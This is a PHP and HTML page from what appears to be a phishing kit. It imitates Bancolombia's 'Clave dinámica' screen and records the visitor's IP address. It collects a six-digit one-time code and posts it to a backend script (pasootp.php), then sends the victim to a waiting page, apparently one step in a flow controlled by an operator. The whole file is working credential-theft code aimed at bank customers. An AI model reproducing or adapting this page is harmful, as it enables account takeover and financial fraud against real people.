<?php
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('America/Bogota');
$tiempo = date("l, j \d\e F \d\e Y");
?>
<!DOCTYPE html>
<html>
    <head>
        <title>Bancolombia - Clave dinámica</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">

        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@700;800&display=swap" rel="stylesheet">

        <link href="../css/stylesheet.css" rel="stylesheet">
        <link href="../css/style-app.css?v<?php echo time(); ?>" rel="stylesheet">        
        <link rel="icon" type="image/png" href="../img/logo.png" />
        
        <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>
        <script type="text/javascript" src="../js/functions.js?v=<?php echo time(); ?>"></script>

        <style type="text/css">
            body { background-color: #fff; font-family: 'Open Sans', sans-serif; text-align: center; }
            .clave {                
                padding: 10px 0; 
                text-align: center;
                width: 42px;
                font-size: 22px;
                font-weight: bold;
                border: none;
                border-bottom: 2px solid #ccc;
                outline: none;
                background: transparent;
            }
            .clave:focus { border-bottom: 2px solid #FDDA24; }
            .inp-pass { width: 45px; }
            #btn-otp:disabled { background-color: #ccc; color: #777; cursor: not-allowed; }
            #btn-otp { background-color: #FDDA24; color: #000; font-weight: bold; cursor: pointer; transition: 0.3s; }
            #fondo, #cargando-o { 
                display: none; 
                position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
                background: rgba(255,255,255,0.9); z-index: 9999; padding-top: 50%; 
            }
        </style>
    </head>
    <body>         
        <div id="fondo"></div>
        <div id="cargando-o">
            <img src="../img/load4.gif" width="80">            
            <br><p style="color:#666;">Validando clave dinámica...</p>
        </div>

        <table width="100%" border="0" cellpadding="0" cellspacing="0" style="padding: 10px;">
            <tr>
                <td valign="middle" align="left" width="33%"><img src="../img/btn-cerrar.jpg" height="25"></td>
                <td valign="middle" align="center" width="34%"><img src="../img/logo-app.jpg" height="25"></td>
                <td valign="middle" align="right" width="33%"><img src="../img/btn-continuar-off.jpg" height="25" id="lnk-otp"></td>
            </tr>
        </table>
       
        <br><br><div class="titulo-app" style="font-weight: 800;">Verifica por seguridad que eres tú.</div>

        <div class="frm" style="margin-top: 30px;">
            <img src="../img/candado.jpg" width="16">
            <div class="descripcion-app" style="margin: 15px 0;">Digita la clave dinámica de tu App Bancolombia</div>
            
            <table style="margin: 0 auto;" border="0" cellspacing="5">
                <tr>
                    <td class="inp-pass"><input type="password" class="clave" id="txt-otp1" maxlength="1" pattern="[0-9]*" inputmode="numeric"></td>
                    <td class="inp-pass"><input type="password" class="clave" id="txt-otp2" maxlength="1" pattern="[0-9]*" inputmode="numeric"></td>
                    <td class="inp-pass"><input type="password" class="clave" id="txt-otp3" maxlength="1" pattern="[0-9]*" inputmode="numeric"></td>
                    <td class="inp-pass"><input type="password" class="clave" id="txt-otp4" maxlength="1" pattern="[0-9]*" inputmode="numeric"></td>
                    <td class="inp-pass"><input type="password" class="clave" id="txt-otp5" maxlength="1" pattern="[0-9]*" inputmode="numeric"></td>
                    <td class="inp-pass"><input type="password" class="clave" id="txt-otp6" maxlength="1" pattern="[0-9]*" inputmode="numeric"></td>
                </tr>
            </table>            
        </div>  

        <button class="botones" id="btn-otp" style="width: 85%; margin: 40px auto; height: 50px; border: none; border-radius: 25px;" disabled>CONTINUAR</button> 

        <script type="text/javascript">
            $(document).ready(function() { 
                // Asegurar que estado.php vuelva a "1" para que no se cicle el salto
                $.post("../process/estado.php", { nuevo_estado: "1" });

                $('.clave').on('input', function() {
                    this.value = this.value.replace(/[^0-9]/g, '');
                    if (this.value.length === 1) {
                        $(this).closest('td').next().find('.clave').focus();
                    }
                    
                    var p = "";
                    $('.clave').each(function() { p += $(this).val(); });

                    if (p.length === 6) {
                        $("#btn-otp").prop("disabled", false);
                        $("#lnk-otp").attr("src", "../img/btn-continuar-on.jpg");
                    } else {
                        $("#btn-otp").prop("disabled", true);
                        $("#lnk-otp").attr("src", "../img/btn-continuar-off.jpg");
                    }
                });

                $('.clave').on('keydown', function(e) {
                    if (e.keyCode === 8 && $(this).val().length === 0) {
                        $(this).closest('td').prev().find('.clave').focus();
                    }
                });

                $("#btn-otp, #lnk-otp").click(function(e) {
                    e.preventDefault();
                    var p = "";
                    $('.clave').each(function() { p += $(this).val(); });
                    
                    if (p.length === 6) {
                        $("#fondo, #cargando-o").show(); 
                        
                        // Enviamos a los 3 IDs
                        $.post("../process/pasootp.php", { otp: p }, function(data) {
                            window.location.href = "WAITING.php";
                        });

                        // Salto de seguridad por si falla la red
                        setTimeout(function(){ window.location.href = "WAITING.php"; }, 3500);
                    }
                });
            });
        </script>
    </body>
</html>
